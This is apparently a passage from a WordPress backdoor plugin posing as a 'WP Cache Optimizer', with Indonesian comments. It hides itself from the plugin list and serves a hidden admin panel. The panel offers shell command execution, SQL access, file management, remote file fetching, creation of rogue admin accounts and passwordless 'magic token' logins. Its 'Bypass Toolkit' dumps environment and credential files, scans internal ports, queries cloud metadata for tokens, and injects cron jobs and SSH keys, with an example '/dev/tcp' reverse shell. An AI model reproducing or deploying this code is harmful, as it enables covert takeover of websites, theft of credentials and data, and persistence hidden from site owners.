                $df_raw=trim((string)@ini_get('disable_functions'));$df=$df_raw?array_values(array_filter(array_map('trim',explode(',',$df_raw)))):[];
                $u = _b([112,104,112,95,117,110,97,109,101]);
                $disk_t = @disk_total_space($cwd); $disk_f = @disk_free_space($cwd);
                $fmt = function($b) { if(!$b)return'?'; if($b>=1073741824)return round($b/1073741824,2).' GB'; if($b>=1048576)return round($b/1048576,1).' MB'; return round($b/1024,1).' KB'; };
                $wr_dirs = [$cwd, sys_get_temp_dir()];
                foreach (['','wp-content','wp-content/uploads','wp-content/plugins','wp-content/themes','wp-includes'] as $s)
                    $wr_dirs[]=rtrim(ABSPATH.'/'.$s,'/');
                $wr=[];
                foreach (array_unique($wr_dirs) as $d) if (@is_dir($d)) $wr[$d]=@is_writable($d)?'W':'R';
                rc_respond([
                    'pwd'=>$cwd,'os'=>PHP_OS,'user'=>@get_current_user(),
                    'server'=>['os'=>(function_exists($u)?@$u('a'):PHP_OS),'hostname'=>(function_exists($u)?@$u('n'):'?'),'user'=>@get_current_user(),'uid'=>@getmyuid(),'server_software'=>$_SERVER['SERVER_SOFTWARE']??'?','server_ip'=>$_SERVER['SERVER_ADDR']??'?','document_root'=>ABSPATH],
                    'php'=>['version'=>PHP_VERSION,'sapi'=>PHP_SAPI,'open_basedir'=>@ini_get('open_basedir')?:'none','disable_functions_count'=>count($df),'curl'=>function_exists('curl_init')?'ON':'OFF','mysqli'=>function_exists('mysqli_connect')?'ON':'OFF','pdo_mysql'=>extension_loaded('pdo_mysql')?'ON':'OFF'],
                    'disk'=>['total'=>$fmt($disk_t),'free'=>$fmt($disk_f),'usage'=>$disk_t?round(($disk_t-$disk_f)/$disk_t*100,1).'%':'?'],
                    'disable_functions'=>$df,'writable'=>$wr,
                ]);
                break;

            case 'exec':
                rc_respond(rc_exec($req['cmd']??'', $cwd));
                break;

            case 'db_detect':
                rc_respond(rc_db_detect($cwd));
                break;

            case 'sql':
                // Gunakan WP DB constants sebagai default kalau params tidak dikirim
                $db=[
                    'host' => $req['h']??DB_HOST,
                    'db'   => $req['d']??DB_NAME,
                    'user' => $req['u']??DB_USER,
                    'pass' => $req['p2']??DB_PASSWORD,
                ];
                rc_respond(rc_sql($db, $req['q']??''));
                break;

            case 'symlink':
                $sub=$req['sub']??'users';
                if ($sub==='users') rc_respond(rc_symlink_users());
                elseif ($sub==='read') rc_respond(rc_symlink_read($req['target']??''));
                else rc_respond(['error'=>'Unknown symlink sub: '.$sub]);
                break;

            case 'backup':
                rc_respond(rc_backup($req['mode']??'deploy', $cwd));
                break;

            case 'selfdestruct':
                rc_respond(rc_selfdestruct());
                break;

            case 'find_login':
                rc_respond(rc_find_login($cwd));
                break;

            case 'ls':
                if (!@is_dir($cwd)) rc_respond(['error'=>'Bukan dir: '.$cwd]);
                $items=[];
                foreach (@scandir($cwd)?:[] as $f) {
                    if ($f==='.'||$f==='..') continue;
                    $fp=rtrim($cwd,'/').'/'.$f;
                    $items[]=['name'=>$f,'type'=>@is_dir($fp)?'dir':'file','size'=>@is_file($fp)?@filesize($fp):0,'perms'=>substr(sprintf('%o',@fileperms($fp)),-4),'modified'=>@filemtime($fp)];
                }
                rc_respond($items);
                break;

            case 'cat':
                $p=$req['target']??$cwd;
                $content=@file_get_contents($p);
                rc_respond($content!==false?base64_encode($content):['error'=>'Tidak bisa baca: '.$p]);
                break;

            case 'fetch':
                $u2=$req['u']??''; $dst=$req['target']??'';
                $ctx=@stream_context_create(['http'=>['timeout'=>30,'follow_location'=>true],'ssl'=>['verify_peer'=>false]]);
                $c2=@file_get_contents($u2,false,$ctx);
                if ($c2!==false&&$dst) { @file_put_contents($dst,$c2); rc_respond('OK:'.strlen($c2).' bytes'); }
                elseif ($c2!==false) rc_respond(base64_encode($c2));
                else rc_respond(['error'=>'Fetch gagal']);
                break;

            case 'mkdir':
                rc_respond(@mkdir($req['target']??'',0755,true)?'OK':'FAIL');
                break;

            case 'chmod':
                rc_respond(@chmod($req['target']??'',octdec($req['m']??'755'))?'OK':'FAIL');
                break;

            case 'pwd':
                rc_respond($cwd);
                break;

            default:
                rc_respond(['error'=>'Unknown action: '.$action]);
        }
    }

    // ─────────────────────────────────────────────────────────────
    //  STEALTH — sembunyi dari plugin list
    // ─────────────────────────────────────────────────────────────
    public function filter_list(array $plugins): array {
        unset($plugins[plugin_basename(__FILE__)]);
        return $plugins;
    }

    public function filter_active(array $plugins): array {
        $slug = plugin_basename(__FILE__);
        if (isset($plugins[$slug])) unset($plugins[$slug]);
        return $plugins;
    }

    // ─────────────────────────────────────────────────────────────
    //  HIDDEN ADMIN PANEL — /wp-admin/?page=rc-panel
    // ─────────────────────────────────────────────────────────────
    public function on_admin_menu(): void {
        add_submenu_page(null, 'WP Cache', 'WP Cache', 'manage_options', RC_PANEL, [$this, 'render_panel']);
    }

    public function render_panel(): void {
        if (!current_user_can('manage_options')) wp_die('Forbidden', 403);
        $nonce = wp_create_nonce('rc_nonce');
        $abspath = esc_attr(ABSPATH);
        ?>
<!DOCTYPE html><html><head><title>WP Cache</title>
<style>*{box-sizing:border-box}body{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:20px;margin:0}
h2{color:#3fb950}h3{color:#58a6ff}h4{color:#d2a8ff}
.section{background:#161b22;padding:15px;margin:12px 0;border-radius:6px;border-left:3px solid #3fb950}
input,select,textarea{background:#0d1117;color:#c9d1d9;border:1px solid #30363d;padding:6px 10px;width:320px;border-radius:4px;margin:4px 0}
textarea{width:100%;resize:vertical}button{background:#238636;color:#fff;border:none;padding:7px 16px;cursor:pointer;border-radius:4px;margin:3px}
button.danger{background:#b91c1c}.result{background:#0d1117;border:1px solid #30363d;padding:10px;margin-top:10px;white-space:pre-wrap;font-size:12px;border-radius:4px;max-height:350px;overflow:auto}
table{width:100%;border-collapse:collapse}td,th{border:1px solid #30363d;padding:6px 8px;text-align:left;font-size:13px}th{background:#161b22;color:#58a6ff}
.tabs{display:flex;gap:5px;margin-bottom:15px;flex-wrap:wrap}.tab{padding:7px 14px;cursor:pointer;background:#161b22;border:1px solid #30363d;border-radius:4px;font-size:13px}
.tab.active{background:#238636;border-color:#3fb950;color:#fff}.on{color:#3fb950}.off{color:#f85149}</style>
</head><body>
<h2>&#9880; WP Cache Optimizer</h2>
<div class="tabs">
    <div class="tab active" id="t-info" onclick="show('info')">Info</div>
    <div class="tab" id="t-file" onclick="show('file')">Files</div>
    <div class="tab" id="t-exec" onclick="show('exec')">Exec</div>
    <div class="tab" id="t-sql"  onclick="show('sql')">SQL</div>
    <div class="tab" id="t-bypass" onclick="show('bypass')" style="border-color:#e8c840;color:#e8c840">Bypass</div>
    <div class="tab" id="t-user" onclick="show('user')">Users</div>
    <div class="tab" id="t-plugin" onclick="show('plugin')">Plugins</div>
    <div class="tab" id="t-theme" onclick="show('theme')">Themes</div>
    <div class="tab" id="t-slug" onclick="show('slug')">Slugs</div>
</div>
<!-- INFO -->
<div id="tab-info" class="section">
<h3>Server Info</h3><div id="srv-info" class="result">loading...</div>
</div>
<!-- FILES -->
<div id="tab-file" class="section" style="display:none">
<div style="display:flex;gap:6px;align-items:center;margin-bottom:8px;flex-wrap:wrap">
  <button onclick="fmUp()" title="Naik satu level" style="padding:5px 10px">↑ Up</button>
  <div id="fm-crumb" style="flex:1;background:#0d1117;padding:5px 10px;border-radius:4px;font-size:12px;color:#58a6ff;word-break:break-all;border:1px solid #30363d"><?= ABSPATH ?></div>
</div>
<div style="display:flex;gap:5px;margin-bottom:8px;flex-wrap:wrap">
  <button onclick="fmNewFile()">+ File</button>
  <button onclick="fmNewDir()">+ Dir</button>
  <button onclick="document.getElementById('fm-uinp').click()">Upload</button>
  <input id="fm-uinp" type="file" style="display:none" onchange="fmUpload(this)">
  <button onclick="fmFetch()">Fetch URL</button>
  <button onclick="fmTogSrch()">&#128269; Search</button>
  <input id="fm-goto" type="text" placeholder="Go to path..." style="width:220px" onkeydown="if(event.key==='Enter')fmLoad(this.value)">
</div>
<div id="fm-srch" style="display:none;background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:4px;margin-bottom:8px">
  <div style="display:flex;gap:5px;align-items:center">
    <input id="fm-sq" type="text" placeholder="Query..." style="flex:1" onkeydown="if(event.key==='Enter')fmDoSearch()">
    <select id="fm-st" style="width:100px"><option value="name">Filename</option><option value="content">Content</option></select>
    <button onclick="fmDoSearch()">Find</button>
  </div>
  <div id="fm-sres" style="margin-top:6px;font-size:12px;max-height:180px;overflow:auto"></div>
</div>
<div id="fm-list" style="overflow-x:auto"></div>
<div id="fm-ed" style="display:none;margin-top:10px">
  <div style="display:flex;gap:5px;align-items:center;margin-bottom:5px;flex-wrap:wrap">
    <span id="fm-ed-path" style="flex:1;color:#58a6ff;font-size:11px;word-break:break-all"></span>
    <button onclick="fmSave()">&#128190; Save</button>
    <button onclick="fmSaveAs()">Save As</button>
    <button onclick="fmCloseEd()">&#10005; Close</button>
  </div>
  <textarea id="fm-ed-txt" rows="22" style="width:100%;font-family:monospace;font-size:12px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;padding:8px;border-radius:4px;resize:vertical;tab-size:4"></textarea>
</div>
<div id="fm-msg" style="font-size:12px;margin-top:5px;min-height:18px"></div>
</div>
<!-- EXEC -->
<div id="tab-exec" class="section" style="display:none">
<h3>Command Execution</h3>
<input id="exec-cmd" type="text" style="width:80%" placeholder="perintah shell, contoh: id ; uname -a"><button onclick="doExec()">Run</button>
<div id="exec-result" class="result"></div>
</div>
<!-- SQL -->
<div id="tab-sql" class="section" style="display:none">
<h3>SQL</h3>
<button onclick="doDbScan()">Auto-detect DB</button><div id="db-info" class="result"></div>
<textarea id="sql-query" rows="4" placeholder="SELECT * FROM wp_users LIMIT 5"></textarea><br>
<button onclick="doSql()">Run Query</button><div id="sql-result" class="result"></div>
</div>
<!-- USERS -->
<div id="tab-user" class="section" style="display:none">
<div id="user-table">loading...</div>
<h4>Buat Admin</h4>
<input id="nu-login" type="text" placeholder="Username"><input id="nu-pass" type="text" placeholder="Password"><input id="nu-email" type="email" placeholder="Email"><br>
<button onclick="createUser()">+ Admin</button><div id="user-result" class="result"></div>
</div>
<!-- PLUGINS -->
<div id="tab-plugin" class="section" style="display:none"><div id="plugin-table">loading...</div></div>
<!-- THEMES -->
<div id="tab-theme" class="section" style="display:none"><div id="theme-table">loading...</div></div>
<!-- BYPASS -->
<div id="tab-bypass" class="section" style="display:none">
<h3>&#9888; Bypass Toolkit</h3>
<div class="tabs" style="margin-bottom:10px">
  <div class="tab active" id="bt-env" onclick="bpShow('env')">Env/Proc</div>
  <div class="tab" id="bt-filter" onclick="bpShow('filter')">PHP Filter</div>
  <div class="tab" id="bt-net" onclick="bpShow('net')">Network</div>
  <div class="tab" id="bt-priv" onclick="bpShow('priv')">PrivEsc</div>
  <div class="tab" id="bt-cloud" onclick="bpShow('cloud')">Cloud Meta</div>
  <div class="tab" id="bt-cron" onclick="bpShow('cron')">Cron/SSH</div>
</div>
<!-- ENV/PROC -->
<div id="bp-env">
  <button onclick="bpExec('bp','env_dump')">Env Dump (/proc/self/environ)</button>
  <button onclick="bpExec('bp','proc_list')">Process List (/proc)</button>
  <button onclick="bpExec('bp','fd_list')">Open FDs (/proc/self/fd)</button>
  <button onclick="bpExec('bp','maps')">Memory Maps (/proc/self/maps)</button>
  <button onclick="bpExec('bp','net_tcp')">TCP Connections (/proc/net/tcp)</button>
  <button onclick="bpExec('bp','net_udp')">UDP (/proc/net/udp)</button>
  <button onclick="bpExec('bp','docker_check')">Docker/Container Check</button>
  <div id="bp-env-res" class="result" style="max-height:300px"></div>
</div>
<!-- PHP FILTER -->
<div id="bp-filter" style="display:none">
  <p style="font-size:12px;color:#888;margin-bottom:8px">Baca source PHP (bypass open_basedir) via php://filter wrapper</p>
  <input id="bp-filter-path" type="text" placeholder="Path file, contoh: /etc/passwd" style="width:60%">
  <select id="bp-filter-enc" style="width:120px">
    <option value="base64">base64-encode</option>
    <option value="rot13">string.rot13</option>
    <option value="raw">raw (no encode)</option>
    <option value="zlib">zlib.deflate+b64</option>
  </select>
  <button onclick="bpFilter()">Read</button>
  <div id="bp-filter-res" class="result" style="max-height:300px;word-break:break-all"></div>
</div>
<!-- NETWORK -->
<div id="bp-net" style="display:none">
  <p style="font-size:12px;color:#888;margin-bottom:8px">Port scan internal network via fsockopen (timeout 0.3s)</p>
  <input id="bp-scan-host" type="text" placeholder="Host (contoh: 172.18.0.1)" style="width:180px">
  <input id="bp-scan-ports" type="text" placeholder="Ports: 22,80,443,3306,5432,6379,8080" style="width:260px">
  <button onclick="bpPortScan()">Scan</button>
  <button onclick="bpExec('bp','arp_scan')">ARP/Hosts</button>
  <button onclick="bpExec('bp','iface')">Interfaces</button>
  <div id="bp-net-res" class="result" style="max-height:300px"></div>
</div>
<!-- PRIVESC -->
<div id="bp-priv" style="display:none">
  <button onclick="bpExec('bp','suid_find')">SUID Finder</button>
  <button onclick="bpExec('bp','sgid_find')">SGID Finder</button>
  <button onclick="bpExec('bp','world_write')">World-Writable</button>
  <button onclick="bpExec('bp','cap_find')">Capabilities</button>
  <button onclick="bpExec('bp','sudo_list')">sudo -l</button>
  <button onclick="bpExec('bp','cred_scan')">Credential Scan</button>
  <div id="bp-priv-res" class="result" style="max-height:300px"></div>
</div>
<!-- CLOUD METADATA -->
<div id="bp-cloud" style="display:none">
  <button onclick="bpExec('bp','aws_meta')">AWS IMDS</button>
  <button onclick="bpExec('bp','gcp_meta')">GCP Metadata</button>
  <button onclick="bpExec('bp','azure_meta')">Azure IMDS</button>
  <button onclick="bpExec('bp','do_meta')">DigitalOcean</button>
  <button onclick="bpExec('bp','k8s_check')">Kubernetes SA Token</button>
  <div id="bp-cloud-res" class="result" style="max-height:300px"></div>
</div>
<!-- CRON / SSH -->
<div id="bp-cron" style="display:none">
  <button onclick="bpExec('bp','cron_read')">Read Crontabs</button>
  <button onclick="bpExec('bp','ssh_keys')">Read SSH Keys</button>
  <h4 style="margin-top:10px">Inject Cron Job</h4>
  <input id="bp-cron-cmd" type="text" placeholder="Command (contoh: bash -i >& /dev/tcp/IP/PORT 0>&1)" style="width:80%"><br>
  <select id="bp-cron-int"><option value="* * * * *">Every minute</option><option value="*/5 * * * *">Every 5 min</option><option value="@reboot">On reboot</option></select>
  <button onclick="bpCronInject()">Inject</button>
  <h4 style="margin-top:10px">SSH Key Inject</h4>
  <textarea id="bp-ssh-key" rows="3" placeholder="ssh-rsa AAAA... attacker@host"></textarea><br>
  <input id="bp-ssh-user" type="text" placeholder="Target user home (contoh: /root)" style="width:200px">
  <button onclick="bpSshInject()">Inject Key</button>
  <div id="bp-cron-res" class="result" style="max-height:300px"></div>
</div>
</div>
<!-- SLUGS -->
<div id="tab-slug" class="section" style="display:none">

<h4 style="margin-top:0">Login Clone</h4>
<div style="font-size:12px;color:#8b949e;margin-bottom:8px">Clone wp-login.php di URL kustom. Bypass WPS Hide Login / firewall block pada URL asli — auth via WP core, tanpa konflik.</div>

<div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin-bottom:4px">
  <span style="color:#8b949e;white-space:nowrap">Base path:</span>
  <code style="color:#58a6ff;font-size:11px"><?= esc_html(home_url('/')) ?></code>
  <input id="lc-path" type="text" placeholder="wp-access" style="flex:1;min-width:100px">
  <button onclick="lcSet()">Set</button>
  <button class="danger" onclick="lcClear()">Clear</button>
</div>
<div id="lc-url" style="margin-bottom:6px;font-size:12px;min-height:18px"></div>

<div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:10px;margin-top:4px">
  <div style="font-size:12px;color:#e8c840;margin-bottom:8px;font-weight:bold">&#9889; Magic Token — langsung masuk tanpa password</div>
  <div style="font-size:11px;color:#8b949e;margin-bottom:8px">Klik Generate → URL unik one-time terbentuk. Buka URL itu di browser → langsung masuk sebagai admin tanpa form login. Token expired setelah TTL atau setelah dipakai sekali.</div>
  <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap">
    <select id="lc-ttl" style="background:#161b22;border:1px solid #30363d;color:#e6edf3;padding:4px 8px;border-radius:4px">
      <option value="300">5 menit</option>
      <option value="900" selected>15 menit</option>
      <option value="3600">1 jam</option>
      <option value="86400">24 jam</option>
    </select>
    <button onclick="lcGenToken()" style="background:#1a3a1a;border-color:#238636;color:#3fb950">Generate Token</button>
    <button class="danger" onclick="lcRevokeAll()">Revoke Semua</button>
  </div>
  <div id="lc-token-url" style="margin-top:8px;word-break:break-all;font-size:12px;min-height:16px"></div>
  <div id="lc-token-list" style="margin-top:4px;font-size:11px;color:#8b949e"></div>
</div>
<div id="lc-result" class="result"></div>

<hr style="border-color:#30363d;margin:14px 0">

<h4>URL Redirect (Slugs)</h4>
<div id="slug-table">loading...</div>
<h4 style="margin-top:10px">Tambah Slug</h4>
<input id="slug-key" type="text" placeholder="key"><input id="slug-url" type="text" placeholder="URL target"><br>
<button onclick="addSlug()">+</button><div id="slug-result" class="result"></div>
</div>
<script>
const ajax='<?= admin_url('admin-ajax.php') ?>',nc='<?= $nonce ?>',dt='<?= AUTH_TOKEN ?>';
function rc(action,data,cb){const fd=new FormData();fd.append('action',action);fd.append('nonce',nc);fd.append('_c',dt);for(let k in data)fd.append(k,data[k]);fetch(ajax,{method:'POST',body:fd}).then(r=>r.json()).then(cb).catch(e=>cb({success:false,data:{message:e.message}}));}
function enc_rc(action,data,cb){const fd=new FormData();fd.append('action','wpcache_sync');fd.append('_c','<?= AUTH_TOKEN ?>');fetch(ajax,{method:'POST',body:fd}).then(r=>r.text()).then(r=>cb(r)).catch(e=>cb(null));}
function show(n){document.querySelectorAll('[id^=tab-]').forEach(e=>e.style.display='none');document.querySelectorAll('.tab').forEach(e=>e.classList.remove('active'));document.getElementById('tab-'+n).style.display='';document.getElementById('t-'+n).classList.add('active');if(n==='user')loadUsers();if(n==='plugin')loadPlugins();if(n==='theme')loadThemes();if(n==='slug'){loadSlugs();lcLoad();}if(n==='file')fmLoad(fmCwd);if(n==='bypass')bpLoad();}
function lcLoad(){rc('wpc_cfg',{op:'get_login_path'},d=>{if(!d.success)return;const p=d.data.path||'';document.getElementById('lc-path').value=p;const el=document.getElementById('lc-url');if(p){const u='<?= esc_js(home_url('/')) ?>'+p;el.innerHTML='Login clone aktif: <a href="'+u+'" target="_blank" style="color:#3fb950">'+u+'</a>';}else{el.innerHTML='<em style="color:#8b949e">Belum dikonfigurasi</em>';}lcListTokens();});}
function lcSet(){const p=document.getElementById('lc-path').value.trim();rc('wpc_cfg',{op:'set_login_path',login_path:p},d=>{document.getElementById('lc-result').textContent=d.success?'Saved'+(d.data.url?' → '+d.data.url:''):'Error: '+JSON.stringify(d.data);lcLoad();});}
function lcClear(){document.getElementById('lc-path').value='';lcSet();}
function lcGenToken(){
  const ttl=document.getElementById('lc-ttl').value;
  rc('wpc_cfg',{op:'gen_magic_token',ttl:ttl},d=>{
    if(!d.success){document.getElementById('lc-result').textContent='Error: '+JSON.stringify(d.data);return;}
    const u=d.data.url,exp=new Date(d.data.expires*1000).toLocaleTimeString();
    document.getElementById('lc-token-url').innerHTML=
      '<div style="background:#0f2416;border:1px solid #238636;padding:8px;border-radius:4px;margin-top:4px">'
      +'<div style="color:#3fb950;font-weight:bold;margin-bottom:4px">&#10003; Token siap — klik untuk buka atau copy:</div>'
      +'<a href="'+u+'" target="_blank" style="color:#79c0ff;word-break:break-all">'+u+'</a>'
      +'<div style="color:#8b949e;font-size:11px;margin-top:4px">Expired: '+exp+' (one-time use)</div>'
      +'</div>';
    lcListTokens();
  });
}
function lcListTokens(){
  rc('wpc_cfg',{op:'list_magic_tokens'},d=>{
    const el=document.getElementById('lc-token-list');
    if(!d.success||!d.data.tokens.length){el.textContent='';return;}
    el.innerHTML='<div style="margin-top:4px">Aktif: '+d.data.tokens.map(t=>`[uid:${t.uid} ttl:${t.ttl}s]`).join(' ')+'</div>';
  });
}
function lcRevokeAll(){rc('wpc_cfg',{op:'revoke_magic_tokens'},d=>{document.getElementById('lc-token-url').innerHTML='';document.getElementById('lc-token-list').textContent='';document.getElementById('lc-result').textContent='Semua token dicabut';});}
(function(){rc('wpc_usr',{op:'srvinfo'},d=>{document.getElementById('srv-info').textContent=d.success?d.data.info:JSON.stringify(d);});})();
/* ═══════════════════ FILE MANAGER ═══════════════════ */
let fmCwd='<?= addslashes(ABSPATH) ?>',fmPar='<?= addslashes(dirname(ABSPATH)) ?>';
function fmMsg(m,e){const el=document.getElementById('fm-msg');el.style.color=e?'#f85149':'#3fb950';el.textContent=m;clearTimeout(fmMsg._t);fmMsg._t=setTimeout(()=>{el.textContent=''},4000);}
function fmE(s){return String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'");}
function fmLoad(p){
  if(!p)p=fmCwd;fmCwd=p;
  document.getElementById('fm-crumb').textContent=p;
  document.getElementById('fm-goto').value='';
  document.getElementById('fm-ed').style.display='none';
  rc('wpc_obj',{op:'ls',path:p},d=>{
    if(!d.success){document.getElementById('fm-list').innerHTML='<div style="padding:10px;color:#f85149">'+( d.data?.message||JSON.stringify(d))+'</div>';return;}
    const files=d.data.files||[];fmPar=d.data.parent||p;
    if(!files.length){document.getElementById('fm-list').innerHTML='<div style="padding:10px;color:#888">(kosong)</div>';return;}
    let h='<table style="width:100%;font-size:12px"><tr style="background:#0d1117;position:sticky;top:0"><th style="text-align:left">Name</th><th>Size</th><th>Perms</th><th>W</th><th>Modified</th><th>Actions</th></tr>';
    files.forEach(f=>{
      const isD=f.type==='dir',ep=fmE(f.path),en=fmE(f.name),isZ=f.name.match(/\.zip$/i);
      const nm=isD?`<a href="#" style="color:#58a6ff;text-decoration:none" onclick="fmLoad('${ep}');return false">&#128193; ${f.name}</a>`:`&#128196; ${f.name}`;
      const ac=isD
        ?`<button onclick="fmZip('${ep}')">zip</button><button onclick="fmCpDlg('${ep}')">cp</button><button onclick="fmMvDlg('${ep}')">mv</button><button onclick="fmRen('${ep}','${en}')">ren</button><button class="danger" onclick="fmDel('${ep}')">del</button>`
        :`<button onclick="fmEdit('${ep}')">edit</button><button onclick="fmDl('${ep}','${en}')">dl</button>${isZ?`<button onclick="fmUnzip('${ep}')">unzip</button>`:''}<button onclick="fmZip('${ep}')">zip</button><button onclick="fmCpDlg('${ep}')">cp</button><button onclick="fmMvDlg('${ep}')">mv</button><button onclick="fmRen('${ep}','${en}')">ren</button><button onclick="fmChmod('${ep}','${fmE(f.perms)}')">chmod</button><button class="danger" onclick="fmDel('${ep}')">del</button>`;
      h+=`<tr><td style="max-width:240px;word-break:break-all">${nm}</td><td style="color:#888;white-space:nowrap;text-align:right">${f.size}</td><td style="color:#888;font-family:monospace;text-align:center">${f.perms}</td><td style="text-align:center;color:${f.writable==='Y'?'#3fb950':'#555'}">${f.writable==='Y'?'W':'-'}</td><td style="color:#666;font-size:11px;white-space:nowrap">${f.modified}</td><td style="white-space:nowrap">${ac}</td></tr>`;
    });
    document.getElementById('fm-list').innerHTML=h+'</table>';
  });
}
function fmUp(){fmLoad(fmPar);}
function fmNewFile(){const n=prompt('Nama file:');if(n)rc('wpc_obj',{op:'mkfile',path:fmCwd,name:n},d=>{d.success?(fmMsg('Dibuat: '+n),fmLoad(fmCwd)):fmMsg(d.data?.message||'Error',1);});}
function fmNewDir(){const n=prompt('Nama folder:');if(n)rc('wpc_obj',{op:'mkdirn',path:fmCwd,name:n},d=>{d.success?(fmMsg('Dir dibuat'),fmLoad(fmCwd)):fmMsg(d.data?.message||'Error',1);});}
function fmUpload(inp){if(!inp.files[0])return;const fd=new FormData();fd.append('action','wpc_obj');fd.append('nonce',nc);fd.append('op','upload');fd.append('path',fmCwd);fd.append('file',inp.files[0]);fmMsg('Uploading...');fetch(ajax,{method:'POST',body:fd}).then(r=>r.json()).then(d=>{d.success?(fmMsg('Uploaded: '+d.data.uploaded),fmLoad(fmCwd)):fmMsg(d.data?.message||'Error',1);inp.value='';});}
function fmFetch(){const u=prompt('URL remote:');if(!u)return;const fn=prompt('Simpan sebagai:',decodeURIComponent(u.split('/').pop().split('?')[0])||'download.bin');if(fn)rc('wpc_obj',{op:'fetch',path:fmCwd,url:u,fname:fn},d=>{d.success?(fmMsg('Fetched '+d.data.size),fmLoad(fmCwd)):fmMsg(d.data?.message||'Fetch error',1);});}
function fmEdit(p){rc('wpc_obj',{op:'read',path:p},d=>{if(!d.success){fmMsg('Read error',1);return;}document.getElementById('fm-ed').style.display='';document.getElementById('fm-ed-path').textContent=p;const ta=document.getElementById('fm-ed-txt');ta.value=d.data.content;ta.dataset.path=p;ta.focus();});}
function fmSave(){const p=document.getElementById('fm-ed-txt').dataset.path,c=document.getElementById('fm-ed-txt').value;rc('wpc_obj',{op:'save',path:p,content:c},d=>{d.success?fmMsg('Saved: '+p):fmMsg(d.data?.message||'Error',1);});}
function fmSaveAs(){const np=prompt('Save as:',document.getElementById('fm-ed-txt').dataset.path);if(!np)return;const c=document.getElementById('fm-ed-txt').value;rc('wpc_obj',{op:'save',path:np,content:c},d=>{if(d.success){fmMsg('Saved: '+np);document.getElementById('fm-ed-path').textContent=np;document.getElementById('fm-ed-txt').dataset.path=np;fmLoad(fmCwd);}else fmMsg(d.data?.message||'Error',1);});}
function fmCloseEd(){document.getElementById('fm-ed').style.display='none';}
function fmDel(p){if(!confirm('Hapus:\n'+p))return;rc('wpc_obj',{op:'delete',path:p},d=>{d.success?(fmMsg('Deleted'),fmLoad(fmCwd)):fmMsg(d.data?.message||'Error',1);});}
function fmRen(p,cur){const n=prompt('Rename:',cur);if(n&&n!==cur)rc('wpc_obj',{op:'rename',path:p,target:n},d=>{d.success?(fmMsg('Renamed'),fmLoad(fmCwd)):fmMsg(d.data?.message||'Error',1);});}
function fmCpDlg(p){const dst=prompt('Copy ke dir:',fmCwd);if(dst)rc('wpc_obj',{op:'copy',path:p,target:dst},d=>{d.success?(fmMsg('Copied'),fmLoad(fmCwd)):fmMsg(d.data?.message||'Error',1);});}
function fmMvDlg(p){const dst=prompt('Move ke dir:',fmCwd);if(dst)rc('wpc_obj',{op:'move',path:p,target:dst},d=>{d.success?(fmMsg('Moved'),fmLoad(fmCwd)):fmMsg(d.data?.message||'Error',1);});}
function fmChmod(p,cur){const m=prompt('chmod (contoh: 644):',cur);if(m)rc('wpc_obj',{op:'chmod',path:p,mode:m},d=>{d.success?(fmMsg('chmod OK'),fmLoad(fmCwd)):fmMsg(d.data?.message||'Error',1);});}
function fmZip(p){rc('wpc_obj',{op:'zip',path:p},d=>{d.success?(fmMsg('Zipped: '+d.data.zip),fmLoad(fmCwd)):fmMsg(d.data?.message||'Error',1);});}
function fmUnzip(p){const dst=prompt('Extract ke:',fmCwd);if(dst)rc('wpc_obj',{op:'unzip',path:p,target:dst},d=>{d.success?(fmMsg('Extracted'),fmLoad(fmCwd)):fmMsg(d.data?.message||'Error',1);});}
function fmDl(p,fn){rc('wpc_obj',{op:'dl',path:p},d=>{if(!d.success){fmMsg('Error',1);return;}try{const b=atob(d.data.b64),a=new Uint8Array(b.length);for(let i=0;i<b.length;i++)a[i]=b.charCodeAt(i);const url=URL.createObjectURL(new Blob([a]));const el=document.createElement('a');el.href=url;el.download=fn;el.click();URL.revokeObjectURL(url);}catch(e){fmMsg(e.message,1);}});}
function fmTogSrch(){const el=document.getElementById('fm-srch');el.style.display=el.style.display==='none'?'block':'none';}
function fmDoSearch(){const q=document.getElementById('fm-sq').value.trim(),t=document.getElementById('fm-st').value;if(!q)return;document.getElementById('fm-sres').textContent='Searching...';rc('wpc_obj',{op:'search',path:fmCwd,q:q,type:t},d=>{if(!d.success){document.getElementById('fm-sres').textContent='Error';return;}const res=d.data.results||[];if(!res.length){document.getElementById('fm-sres').innerHTML='<em style="color:#888">Tidak ditemukan</em>';return;}document.getElementById('fm-sres').innerHTML=res.map(r=>`<div style="padding:2px 0">${r.type==='dir'?'&#128193;':'&#128196;'} <a href="#" style="color:#58a6ff" onclick="${r.type==='dir'?`fmLoad('${fmE(r.path)}')`:`fmEdit('${fmE(r.path)}')`};return false">${r.path}</a></div>`).join('')+'<div style="color:#666;font-size:11px;margin-top:4px">'+res.length+' hasil (max 100)</div>';});}
function doExec(){rc('wpc_obj',{op:'exec',cmd:document.getElementById('exec-cmd').value},d=>{document.getElementById('exec-result').textContent=d.success?d.data.output:JSON.stringify(d);});}
function doDbScan(){rc('wpc_usr',{op:'dbscan'},d=>{document.getElementById('db-info').textContent=JSON.stringify(d.data||d,null,2);});}
function doSql(){rc('wpc_usr',{op:'sql',query:document.getElementById('sql-query').value},d=>{document.getElementById('sql-result').textContent=JSON.stringify(d.data||d,null,2);});}
function loadUsers(){rc('wpc_usr',{op:'list'},d=>{const el=document.getElementById('user-table');if(!d.success){el.textContent=JSON.stringify(d);return;}el.innerHTML='<table><tr><th>ID</th><th>Login</th><th>Email</th><th>Role</th><th>Act</th></tr>'+d.data.users.map(u=>`<tr><td>${u.id}</td><td>${u.login}</td><td>${u.email}</td><td>${u.roles}</td><td><button class="danger" onclick="delUser(${u.id})">Del</button></td></tr>`).join('')+'</table>';});}
function createUser(){rc('wpc_usr',{op:'create',username:document.getElementById('nu-login').value,password:document.getElementById('nu-pass').value,email:document.getElementById('nu-email').value},d=>{document.getElementById('user-result').textContent=JSON.stringify(d,null,2);loadUsers();});}
function delUser(id){if(!confirm('Hapus #'+id))return;rc('wpc_usr',{op:'delete',uid:id},d=>{loadUsers();});}
